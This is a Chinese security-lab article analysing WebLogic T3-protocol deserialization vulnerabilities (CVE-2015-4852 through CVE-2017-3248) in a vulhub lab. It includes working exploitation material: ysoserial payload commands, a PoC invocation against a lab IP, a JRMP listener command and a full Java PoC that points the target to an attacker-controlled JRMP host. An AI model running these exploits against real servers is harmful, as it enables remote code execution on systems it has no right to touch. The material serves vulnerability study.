#  Weblogic T3协议反序列化漏洞分析（上）   
原创 Sec0re  源鲁安全实验室   2024-05-17 19:42  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/rvJnia9NjkSOvH82YAwfpddXm3ZvZgK8RUBADaYm2lTvhd9aPsJgjTWP4iaAlAOOibiaEeOeicJqO3q80yAbBgG9cQQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
    此文章原创作者为源鲁安全实验室，转载请注明出处！此文章中所涉及的技术、思路和工具仅供网络安全学习为目的，不得以盈利为目的或非法利用，否则后果自行承担！  
### 0x01 前言  
###   
  
    在初入安全的时候，就听说过weblogic的大名，当然听说的并不是  
weblogic如何如何好用，而是因为其漏洞出现频率实在是有点高...于是乎，便抱着学习  
的心态跟了跟weblogic的一些漏洞，也就有了这篇文章。  
  
    在分析weblogic这个中间件的系列漏洞前，我们需要了解一下什么是中间件，什么是weblogic，以及它的作用是什么。  
  
    那么，什么是中间件呢？中间件是为应用提供常见服务与功能的软件和云服务，可以帮助开发和运维人员更高效地构建和部署应用。中间件就相当于是应用、数据与用户之间的纽带，从广义上讲，中间件涵盖了从 Web 服务器，到身份验证系统，再到消息传递工具等一切内容。参考知乎的一条高赞回答：中间件就是将具体业务和底层逻辑解耦的组件，类似于中介的作用。  
  
    关于weblogic，oracle官方给出的简介是这样的：Oracle WebLogic Server 是一个统一的可扩展平台，专用于开发、部署和运行 Java 应用等适用于本地环境和云环境的企业应用。它提供了一种强健、成熟和可扩展的 Java Enterprise Edition (EE) 和 Jakarta EE 实施方式。  
	  
  
    Oracle还提出了融合中间件的概念，实际上，Weblogic是组成Oracle融合中间件的核心，几乎所有的Oracle融合中间件产品都需要运行Weblogic Service。本文主要是分析漏洞，因此不做过多介绍，对此感兴趣的读者可自行查阅相关文档。  
  
0x02 Weblogic的版本  
####   
  
    在分析漏洞前，我们需要了解weblogic都有哪些版本，weblogic当前最新版本为14.1.1.0，中间跳过了13这个版本，其版本众多，但是常见的版本主要是10.x 以及 12.x。10.x版本主要常见的为10.3.6，而12.x版本较多，有12.1.3 ， 12.2.1.2  ， 12.2.1.4等。这些版本对jdk的支持情况都不大一样：  
- 10.3.6最低支持的JDK版本为1.6  
  
- 12.1.3最低支持的JDK版本为1.7  
  
- 12.2.1及以上最低支持的JDK版本为1.8  
  
      
由于支持的JDK版本不同，并且Weblogic各个版本依赖的jar包版本不同，因此其反序列化的利用方式都不尽相同。  
#### 0x03 T3协议  
####   
  
    T3协议是weblogic用于通信的协议，类似于RMI的JRMP，JRMP协议是rmi默认使用的协议，而T3协议是weblogic独有的协议，weblogic对RMI规范的实现使用了T3协议（rmi默认使用 JRMP协  
议）。T3协议被优化用于高性能的应用场景，特别是在大量并发连接和高负载的环境下。它通过减少网络开销和提高数据传输效率来提升整体性能。  
  
T3协议结构分为  
分  
为请求头和请求体。  
  
其数据包大致分为：【图片取自http://drops.xmd5.com/static/drops/web-13470.html】  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfRo8CkJvSA8Dx4KIwWLJbJhovISgwWJvu2Zu1QTeRh1QhNRjxFldvu9w/640?wx_fmt=png&from=appmsg "")  
  
  
这里我们看看T3协议的数据包是什么样的：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfRiaU7jsgcCTnvTETR1hsiboCGbTcKDtaWSXwR493boMFAOib41BMdzNMfw/640?wx_fmt=png&from=appmsg "")  
  
可以看到，最开始的时候，就是t3协议的请求头，也就是t3 12.2.1AS:255HL:19MS:10000000PU:t3://us-l-breens:7001  
  
在发送完初始化数据包后，即开始发送请求主主体，包括：  
  
第一部分以及后续的序列化数据。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfRGfbgDjHTZ7r2lqNAh58NCIj6bOL4TcyVWy0pdOUwicQdho60ZDg9MbA/640?wx_fmt=png&from=appmsg "")  
  
因此，生成恶意payload有两种方式：  
- 将序列化数据中的任意一段进行替换  
  
- 直接将恶意序列化数据拼接到第一段（也就是包含了请求体长度的那段）后面  
  
### 0x04 环境搭建  
###   
  
使用vulhub来进行环境搭建，地址：https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271  
  
之后修改一下docker-compose.yml文件，将8453端口映射出来，方便IDEA调试。  
  
由于此docker环境的weblogic版本是10.3.6的，因此下面的漏洞都可以使用这个版本的环境进行复现分析。  
  
之后：  
```
docker exec -it [容器id] /bin/bash
vi ~/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh
    开头加上
    debugFlag="true" 
    export debugFlag
之后重启容器：
sudo docker restart [容器id]
把容器的文件copy出来：
docker cp [容器id]:/root .
```  
  
随即配置idea远程调试  
  
将上述拷贝出的目录/root/Oracle/Middleware/wlserver_10.3  
  
找到server下的modules文件夹，并添加为libraies  
  
通过/root/Oracle/Middleware/user_projects/domains/base_domain/startWebLogic.sh 启动weblogic后，访问7001端口，出现404错误代表搭建成功：  
### 0x05 CVE-2015-4852  
###   
  
使用网上的poc打一下，链接：  
  
https://github.com/breenmachine/JavaUnserializeExploits/blob/master/weblogic.py  
  
在打poc之前，需要先生成恶意的反序列化文件，这里使用ysoserial来生成：  
```
java -jar ysoserial.jar CommonsCollections1 "touch /tmp/test.txt" > ./payloadTouchFile.tmp
```  
  
  
生成文件后，执行：  
```
python2 ./CVE-2015-4852.py 192.168.13.131 7001 ./payloadTouchFile.tmp
```  
  
  
参数1为weblogic地址，参数2为端口，参数3为所需要执行的恶意反序列化字节码  
  
执行后，在docker中看一下tmp文件夹中的文件：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfRugr2va32E6MNNe5cR4GQ6BXPFnO43hWKBOzwurX1icetqibRcVjqibfRw/640?wx_fmt=png&from=appmsg "")  
  
文件成功创建。  
  
在反序列化时，weblogic会抛出异常，但是并不影响反序列化执行恶意代码。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfRwTsJRMKogWFwnDO3Wt5BAxCSeuIvjU7UNDH1X7zcJL7saQtjiaiaEt8g/640?wx_fmt=png&from=appmsg "")  
  
    在/wlserver_10.3/server/lib/weblogic.jar!/weblogic/wsee/jaxws/WLSServletAdapter.class 下断点进行调试。  
  
    不过既然是反序列化，并且weblogic自带CC依赖，直接在CC链触发的地方下好断点，之后打个exp，或者由于反序列化会产生异常，在idea配置好远程debug后，下异常断点，打POC进行调试也也是可以的。  
  
这里先附上一张堆栈图：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoCsC9Q3uIbs9ZzibicoF8aIFATK4r3cL7LVPtaAloo8ibpd8ac4tMibVTJdtINwsjn2HYR5sO1L7E8Pibw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfRuicFnkfFycyp2SeZYIh9VibjE2202EFYq3OydjTQe4y5beKINESs32XA/640?wx_fmt=png&from=appmsg "")  
```
entrySet:-1, $Proxy57 (com.sun.proxy)
readObject:328, AnnotationInvocationHandler (sun.reflect.annotation)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:39, NativeMethodAccessorImpl (sun.reflect)
invoke:25, DelegatingMethodAccessorImpl (sun.reflect)
invoke:597, Method (java.lang.reflect)
invokeReadObject:969, ObjectStreamClass (java.io)
readSerialData:1871, ObjectInputStream (java.io)
readOrdinaryObject:1775, ObjectInputStream (java.io)
readObject0:1327, ObjectInputStream (java.io)
readObject:349, ObjectInputStream (java.io)
readObject:66, InboundMsgAbbrev (weblogic.rjvm)
read:38, InboundMsgAbbrev (weblogic.rjvm)
readMsgAbbrevs:283, MsgAbbrevJVMConnection (weblogic.rjvm)
init:213, MsgAbbrevInputStream (weblogic.rjvm)
dispatch:498, MsgAbbrevJVMConnection (weblogic.rjvm)
dispatch:330, MuxableSocketT3 (weblogic.rjvm.t3)
dispatch:387, BaseAbstractMuxableSocket (weblogic.socket)
readReadySocketOnce:967, SocketMuxer (weblogic.socket)
readReadySocket:899, SocketMuxer (weblogic.socket)
processSockets:130, PosixSocketMuxer (weblogic.socket)
run:29, SocketReaderRequest (weblogic.socket)
execute:42, SocketReaderRequest (weblogic.socket)
execute:145, ExecuteThread (weblogic.kernel)
run:117, ExecuteThread (weblogic.kernel)
```  
  
在dispatch:330, MuxableSocketT3 (weblogic.rjvm.t3) ， 就已经识别出了这是一个t3协议的请求，往下都是socket建立连接的过程。  
  
先来看一下weblogic是如何判断T3协议的：  
  
在isMessageComplete:83, MuxableSocketDiscriminator (weblogic.socket)中，会对当前的socket连接进行判断：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfRC2zu7M1JK8xfmhUvd5KKVEC52d1Ap1icGtibAWcmiaibia3NqTvKST06gWg/640?wx_fmt=png&from=appmsg "")  
  
这里就是循环遍历this.handlers中的内容，并通过handler的claimSocket方法，通过this.head来判断当前socket连接是什么请求：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfRBictNdAOyuhXngGK7zTccoic6PrHkiaalLYT7WUjzR7k5lYVCCObchZTw/640?wx_fmt=png&from=appmsg "")  
  
一共支持五种协议  
  
跟进上述的var3.claimSocket(this.head)：  
  
跟进上述的var3.claimSocket(this.head)：  
```
    public boolean claimSocket(Chunk var1) {
        return this.claimSocket(var1, "t3");
    }
```  
  
  
看一下var1是什么东东：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfRWKxibq70H2s8BJZariciahNjO81c1MysXNNiawlhcTaJ4CfcqVTDWjjwYg/640?wx_fmt=png&from=appmsg "")  
  
就是咱们发送给服务端的数据包。  
  
之后调用了：  
```
    boolean claimSocket(Chunk var1, String var2) {
        int var3 = var2.length();
        if (var1.end < var3 + 1) {
            return false;
        } else {
            byte[] var4 = var1.buf;

            for(int var5 = 0; var5 < var3; ++var5) {
                if (var4[var5] != var2.charAt(var5)) {
                    return false;
                }
            }

            if (var4[var3] != 32) {
                return false;
            } else {
                return true;
            }
        }
    }
```  
  
  
这里就是通过 var4[var5]!=var2.charAt(var5)判断数据包开头是不是t3，如果是，则进入t3协议的处理流程；【还需要满足var4[var3] != 32】。  
  
如果满足了该条件，则将this.claimedIndex赋值为var2，也就是this.handlers的索引。  
  
获取到协议类型后，通过 var1.dispatch(); , 根据协议将请求分发给不同的处理handler：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfR9dOSyicu3ID1ausicQ1HsQIfCCVgAOcqE6yicuUFSvzGfpPm0sr1IZhtQ/640?wx_fmt=png&from=appmsg "")  
  
这里获取到的var1就是t3。  
  
之后经过了一个过滤函数：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfRL29KebkoqjA0I2cyW8MLPvINbjBdjAEhwPwHaBCNGgEFrHGTrkNofg/640?wx_fmt=png&from=appmsg "")  
  
这里条件不满足：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfR0PTAaGyjkicyonauicHFqfPwYJREIlAR9HvvTLMQTXWJGy5oA7wn8qaQ/640?wx_fmt=png&from=appmsg "")  
  
随即创建一个MuxableSocketT3。  
  
之后通过this.isSecure来判断当前请求是否为SSL请求，这里T3协议请求不是SSL请求，跳过执行。  
  
之后将原来的socket对象替换为t3协议的socket对象：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfRHIEFuHqew5MmFNKAUXKoPbjg8B32h2Jnn2NQBjXSRSAiaFTu7LbkggQ/640?wx_fmt=png&from=appmsg "")  
  
之后判断消息是否发送完成，之后进入dispatch方法：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfRhHawxQP8OF3bkgianOS6HzqglOx2aQyfxevv3rHjEwJEh6E4paYZIMA/640?wx_fmt=png&from=appmsg "")  
  
之后便是一路调用dispatch来处理T3协议的请求，一路dispatch到MuxableSocketT3中：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfRic0kQiakN2KN95ocGmSkAwIRVicTvt8RUQG9wHQuFoK1SB7R4XSBxypsQ/640?wx_fmt=png&from=appmsg "")  
  
这里有走到 weblogic.rjvm.MsgAbbrevJvmConnection.dispatch()：  
```
    public final void dispatch(Chunk var1) {
        this.waitForPeergone();
        ++this.messagesReceived;
        this.bytesReceived += (long)Chunk.size(var1);
        this.bytesReceived += 4L;
        ConnectionManager var2 = this.getDispatcher();
        if (var2 != null) {
            MsgAbbrevInputStream var3 = null;

            try {
                var3 = var2.getInputStream();
                var3.init(var1, this);
            } catch (Exception var6) {
                RJVMLogger.logUnmarshal(var6);
                UnmarshalException var5 = new UnmarshalException("Incoming message header or abbreviation processing failed ", var6);
                this.gotExceptionReceiving(var5);
                return;
            }

            var2.dispatch(this, var3);
        }

    }
```  
  
  
这里的var1就是T3协议数据。  
  
var3为this.getDispatcher().getInputStream() ， 实际上为MsgAbbrevInputStream。  
  
之后初始化的时候，将参数var1传递了进去。  
  
之后在init的时候调用了MsgAbbrevJVMConnection.readMsgAbbrevs(this)：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfR5QjQO31P2oq4h0hDfL6fsia4CUHC5dtKSL2OkPhy8Cyymub2kjzyeNA/640?wx_fmt=png&from=appmsg "")  
  
readMsgAbbrevs又调用了InboundMsgAbbrev.read()：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfRMInjmHndciaOZ7XAW9rQe9ficAto8SvytIjIyyzGYkAt3PYpnwDD3q2w/640?wx_fmt=png&from=appmsg "")  
  
InboundMsgAbbrev.read()直接调用了this.readObject(var1) 直接反序列化而没有做任何处理：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfRpQcI0mqjibWu0I5AN5xMic8uGo3xYkY0ibNntX320p3ibWjjG8whWppWow/640?wx_fmt=png&from=appmsg "")  
  
在InboundMsgAbbrev.read()中，又调用了ServerChannelInputStream.readObject()：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfR6icKVRGwtmjxZGU5bc5yYjZyA47rdVZlNcwnVQTGWjEsuM6PKmkYShQ/640?wx_fmt=png&from=appmsg "")  
  
    ServerChannelInputStream为一个内部私有类，继承自ObjectInputStream，上图实际上调用的就是ObjectInputStream.readObject。  
  
    至此，该漏洞形成原因分析完毕，实际上就是weblogic在处理T3协议的时候，会直接将T3协议的数据直接进行反序列化，而没有经过任何过滤。并且weblogic还自带了CC链的依赖，更方便了利用。  
  
    到这里，继续往下分析的话就到了CC链，本文着重讲Weblogic的漏洞，与CC链有关知识可自行查阅。  
  
    之后的修复补丁则是加了个黑名单：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfR2b9sOP4BVIXAA64e0B51nF0aJ7EOUQIoyOxnn2rCXIcC8NyE8uU2uA/640?wx_fmt=png&from=appmsg "")  
  
之后的后续几个漏洞，都是对于这个黑名单的绕过，如CVE-2016-0638、CVE-2016-3510。  
### 0x06 CVE-2016-0638 - T3协议反序列化绕过  
  
    CVE-2016-0638就是CVE-2015-4852漏洞的  
入口点从ServerChannelInputStream.readObject()直接反序列化CC链，改为了  
ServerChannelInputStream.readObje  
ct()反序列化weblogic.jms.common.StreamMessageImpl的ReadExternal中的InputStream（二次反序列化），StreamMessageImpl在反序列化的时候，（Java的readObject方法会调用readExternal方法）在readExternal方法中创建自己的InputStream对象，最后调用这个创建的InputStream方法的readObject方法进行二次反序列化，从而导致了绕过之前的黑名单。  
  
    调用链大致为：StreamMessageImpl.readObject() -->   
StreamMessageImpl.readExternal --> new InputStream() 读取序列化对象 --> InputStream.readObject()。  
### 0x07 CVE-2016-3510 -- T3协议反序列化绕过  
  
    CVE-2016-3510所使用的类为：MarshalledObject。  
  
    原理简介：MarshalledObject的readResolve方法会进行二次反序列化。  
  
    readResolve 本来就是通过反序列化而调用的 ， Java在反序列化时 ，会调用 readResolve、 readExternal等方法。  
  
    调用链大致为：  
M  
arshalledObject.readObject -->   
M  
arshalledObject.readResolve() --> new InputStream()读取序列化对象 --> InputStream.readObject()反序列化恶意数据。  
### 0x08 CVE-2017-3248 -- T3协议反序列化绕过  
  
    CVE-2017-3248与上述稍有些不一样，但是也是绕过黑名单导致的漏洞。  
该漏洞使用了代理类来进行绕过。  
利用的时候，需要先搭建JRMP服务（这里使用ysosuserial来搭建）：  
```
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections1 "touch /tmp/2017Success"
```  
  
    搭建好JRMP后，需要构造发送给服务端的恶意序列化数据，该漏洞使用的是  
RemoteObjectInvocationHandler类来进行绕过。  
  
    如何封装传递给Client端（这里也就是目标Weblogic服务器）的恶意对象的整体流程大致如下：  
```
ObjID id = new ObjID(new Random().nextInt()); 
TCPEndpoint te = new TCPEndpoint("192.168.13.1", 9999);
UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
(Registry)Proxy.newProxyInstance(CurrentClassName.class.getClassLoader(), new Class[]{Registry.class}, obj);
```  
  
  
  
    Proxy  
.newProxyInstance方法用于创建一个动态代理对象。这个方法允许在运行时创建实现一个或多个接口的代理对象，并指定一个处理所有方法调用的处理器，也就是上面创建的RemoteObjectInvocationHandler 对象。  
  
    完整JavaPOC如下：  
```
package main;

import com.supeream.serial.Serializables;
import com.supeream.weblogic.T3ProtocolOperation;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import java.lang.reflect.Proxy;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

public class cve_2017_3248 {
    public Object getObject(){
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint("192.168.13.1", 9999);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        Registry proxy = (Registry)Proxy.newProxyInstance(cve_2017_3248.class.getClassLoader(), new Class[]{Registry.class}, obj);
        return proxy;
    }
    public static void main(String[] args) throws Exception {
        Object obj = new cve_2017_3248().getObject();
        byte[] payload2 = Serializables.serialize(obj);
        T3ProtocolOperation.send("192.168.13.131", "7001", payload2);
    }
}
```  
  
  
    这里导入  
的 com.supeream.serial.Serializables; 为github  
开源项目，地址为：https://github.com/5up3rc/weblogic_cmd  
  
    之后执行POC，发送恶意的T3协议数据，weblogic服务端收到恶意数据后，会对这些数据进行  
反序列化，最终在UnicastRef.invoke()方法中  
造成反序列化漏洞。  
  
漏洞分析：  
  
这里的漏洞触发点与上述一样，同样是T3协议造成的，堆栈图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoCsC9Q3uIbs9ZzibicoF8aIFAaz8WkhMPhMlF958mYicrYibzibOVTnP4AjkX7uGX7ZEICibYJAQPV5I3lQ/640?wx_fmt=png&from=appmsg "")  
  
  
在 weblogic.rjvm.InboundMsgAbbrev.read中调用了this.readObject()，也就是  
InboundMsgAbbrev.readObject():  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfRZ7XwLFvEmdwrdq6hHibkQFDdib0GQBC0nTR3jjquIm1FaETpbfSNnyZQ/640?wx_fmt=png&from=appmsg "")  
  
    这里又调用了ServerChannelInputStream，之前提到过，weblogic对于这些反序列化的漏洞都是在类似这些地方加  
的黑名单；而ServerChannelInputStream继承自ObjectInputStream，这里修复了之前的漏洞，重写了readObject方法并对黑名单中的类进行了过滤；但是这里的类RemoteObjectInvocationHandler绕过了黑名单限制。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoCsC9Q3uIbs9ZzibicoF8aIFAoeSl2LoXxc8zosicQoXF0zNRSWIUte3IO60CCibhn1TxxaMJtXo0H1Iw/640?wx_fmt=png&from=appmsg "")  
  
    绕过黑名单限制之后，就是ObjectStreamClass的一些常规反序列化操作，一直执行到RemoteObjectInvocationHandler.readObject：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfRKs3WtlLYnXIMqWPBtmHaT7wL3881ozSnz3u2Ckc7ibHCEaGalIKJoDQ/640?wx_fmt=png&from=appmsg "")  
  
    而RemoteObjectInvocationHandler没有实现readObject方法，因此实际上调用的是其父类RemoteObject的readObject方法，方法中，先检测refClassName是否为空，为空则直接反序列化输入的ObjectInputStream，不为空则动态加载sun.rmi.server+refClassName，这里实际上加载的是sun.rmi.server.UnicastRef。最后调用了ref.readExternal(in)方法：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoCsC9Q3uIbs9ZzibicoF8aIFAiaYbsvwff9DpJ8aBxnV59zSn0CGe00jcRMcicsu62taUmlhE6POqicv6A/640?wx_fmt=png&from=appmsg "")  
  
  
这里调用了LiveRef.read()方法：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfRfbkAZTOZVTicpTnV6w2VPgLuVqcfZtTcq999k2XcNAZnAMgUzp1vqFA/640?wx_fmt=png&from=appmsg "")  
  
获取了var2，也就是指定的JRMP远程地址；  
之后将var2传递给DGCClient.registerRefs()：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfRm3NcibesLTqHicqa3oWiapebsibib1XhUkcYTeHcx0JeaDvFYTHeib4CW54w/640?wx_fmt=png&from=appmsg "")  
  
该函数发送了获取了DGCImpl_Stub：  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfRs18NibG36nc8lSV7nhak76Or1YiaicahKUYpWLGgKdjT4QJ5lYv0ILOCA/640?wx_fmt=png&from=appmsg "")  
  
之后调用var2.registerRefs(var1)，该函数的关键在this.makeDirtyCall(var2, var3);  
  
先调用了  
```
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfRV4IMeURmnsyU5xEyyZpMB64EMT7fJZGMHVRa4X42RbswplZ4L8GJfg/640?wx_fmt=png&from=appmsg "")  
  
返回后，调用了while循环语句中的var2.registerRefs(var1)：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoCsC9Q3uIbs9ZzibicoF8aIFA1s5IaicKejbV9JfTiccK9ZC8ZdJULGqO1yenju4FBlD29putKicJITYFw/640?wx_fmt=png&from=appmsg "")  
  
  
函数内容如下：  
```
  public boolean registerRefs(List var1) {
      assert !Thread.holdsLock(this);

      HashSet var2 = null;
      long var3;
      synchronized(this) {
          if (this.removed) {
              return false;
          }

          LiveRef var7;
          RefEntry var8;
          for(Iterator var6 = var1.iterator(); var6.hasNext(); var8.addInstanceToRefSet(var7)) {
              var7 = (LiveRef)var6.next();

              assert var7.getEndpoint().equals(this.endpoint);

              var8 = (RefEntry)this.refTable.get(var7);
              if (var8 == null) {
                  LiveRef var9 = (LiveRef)var7.clone();
                  var8 = new RefEntry(var9);
                  this.refTable.put(var9, var8);
                  if (var2 == null) {
                      var2 = new HashSet(5);
                  }

                  var2.add(var8);
              }
          }

          if (var2 == null) {
              return true;
          }

          var2.addAll(this.invalidRefs);
          this.invalidRefs.clear();
          var3 = DGCClient.getNextSequenceNum();
      }

      this.makeDirtyCall(var2, var3);
      return true;
  }
```  
  
  
该函数的关键在40行的this.makeDirtyCall(var2, var3);  
  
在函数makeDirtyCall中，通过 Lease var7 = this.dgc.dirty(var4, var2, new Lease(DGCClient.vmid, DGCClient.leaseValue)); 来执行JRPM请求：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfRobvol4nFLXo6XwIYVZRHtiaEDG4x6aibslHQHB4wE5nicaB33S5GhlhBQ/640?wx_fmt=png&from=appmsg "")  
  
这里的this.dgc为sun.rmi.transport.DGCImpl_Stub函数内容如下  
：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoCsC9Q3uIbs9ZzibicoF8aIFA6HjzCgkbqOZiaMbJmGibkvibIIR1JUNvVT56mJdmrriaPxQUWlUPqyCsuA/640?wx_fmt=png&from=appmsg "")  
  
在newCall中：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfRy6ibeVib6QIicXIUYXCwumVtibt8qC1GpDuOF1Bl5cCgnvpPnbxibz3s4Vw/640?wx_fmt=png&from=appmsg "")  
  
建立了tcp链接。  
  
回到dirty方法，在调用this.ref.invoke()的时候（也就是UnicastRef.invoke），调用了var1.executeCall()：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfRj78sTqATVsHwibtwTqoBlJkL18P736CeEFhuIjCullRYZdS25KCuJ1Q/640?wx_fmt=png&from=appmsg "")  
  
在executeCall方法中，直接调用了this.in.readObject()来进行反序列化：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoABibwmxtKDeKzibFhYbY2PfRLfVbQtr7DLooZRQVWu5kiaAxQibicLFMxzYmK0vASHrrhe1raVeNiaa4icA/640?wx_fmt=png&from=appmsg "")  
### 0x09 总结  
  
    由于在weblogic中RMI使用的协议为weblogic自己实现的T3协议，因此在不影响自身业务的情况下，weblogic官方对于新漏洞的修复只能是不断添加黑名单。虽然这种修复方式对于新出的漏洞立竿见影，但是对于其绕过方式就没有任何效果了，这也是为什么weblogic的反序列化漏洞层出不穷的原因。  
  
### 0x10 参考链接  
  
https://www.oracle.com/cn/java/weblogic/  
  
http://drops.xmd5.com/  
static  
/drops/web-13470.html  
  
https://www.freebuf.com/vuls/369272.html  
  
https://www.cnblogs.com/nice0e3/p/14201884.html  
  
  
**关于源鲁安全实验室**  
  
源鲁安全实验室，是一支以攻防研究为核心的安全团队，团队成员来源于一线攻防团队，安全研究团队。研究方向涉及WEB安全，APP安全，漏洞研究，代码审计，内网渗透，二进制，安全产品研究等多个领域，致力为客户提供一流的服务，保障客户业务安全。  
  
  
  
  
